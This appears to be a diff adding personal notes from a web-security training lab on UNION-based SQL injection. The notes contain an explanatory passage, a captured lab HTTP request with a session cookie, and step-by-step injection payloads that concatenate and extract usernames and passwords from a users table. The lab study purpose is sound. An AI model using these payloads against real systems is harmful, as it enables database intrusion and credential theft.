@@ -1,0 +1,42 @@
+
+You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+' UNION SELECT username || '~' || password FROM users--
+This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.
+
+The results from the query contain all the usernames and passwords, for example:
+
+...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+
+Different databases use different syntax to perform string concatenation. For more details, see the SQL injection cheat sheet.
+
+
+org req :-
+
+GET /filter?category=Lifestyle HTTP/2
+Host: 0ae8000604dd1903817ea2ab00e2001b.web-security-academy.net
+Cookie: session=2JIHM0XUyRS33Y2sGXpVPuNGbaKNHama
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ae8000604dd1903817ea2ab00e2001b.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+steps:- 
+
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,'abc'--
+' UNION SELECT NULL,username || '-' || password FROM users--
